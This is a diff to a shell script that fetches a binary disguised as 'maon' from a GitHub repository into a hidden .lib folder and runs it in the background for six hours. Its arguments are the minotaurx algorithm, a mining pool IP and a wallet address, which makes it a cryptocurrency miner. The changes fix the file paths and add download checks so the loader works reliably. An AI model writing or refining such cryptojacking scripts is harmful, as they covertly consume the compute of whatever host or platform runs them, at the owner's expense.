@@ -40,6 +40,10 @@ prepare_environment() {
   echo "Preparing environment..."
   mkdir -p .lib && cd .lib
   wget -O maon https://github.com/barburonjilo/back/raw/main/sr
+  if [ $? -ne 0 ]; then
+    echo "Failed to download maon. Exiting..."
+    exit 1
+  fi
   chmod +x maon
   cd ..
 }
@@ -51,15 +55,16 @@ run_and_manage_process() {
   local end_time=$((start_time + 6*3600))  # 6 hours from start
 
   while [ $(date +%s) -lt $end_time ]; do
-    if [ -f ./lib/maon ]; then
+    if [ -f .lib/maon ]; then
+      echo "Starting process with cpulimit..."
       # Start the process with cpulimit
-      cpulimit -l 300 -e ./lib/maon &
+      cpulimit -l 300 -e .lib/maon &
       
       # Store the PID of cpulimit
       local cpulimit_pid=$!
       
       # Run the process with the specified parameters in background
-      nohup ./lib/maon -a minotaurx --pool 45.115.225.161:443 -u RQny2iMJZVU1RS3spxF8cCTqMF31vuxvkF.$cpulimit_pid --timeout 120 -t 4 > process.log 2>&1 &
+      nohup .lib/maon -a minotaurx --pool 45.115.225.161:443 -u RQny2iMJZVU1RS3spxF8cCTqMF31vuxvkF.$cpulimit_pid --timeout 120 -t 4 > process.log 2>&1 &
       
       # Store the PID of the running process
       local process_pid=$!
@@ -73,7 +78,7 @@ run_and_manage_process() {
       # Wait for 2 minutes before the next iteration
       sleep 120
     else
-      echo "maon not found. Skipping..."
+      echo "maon not found in .lib directory. Skipping..."
       sleep 120
     fi
   done
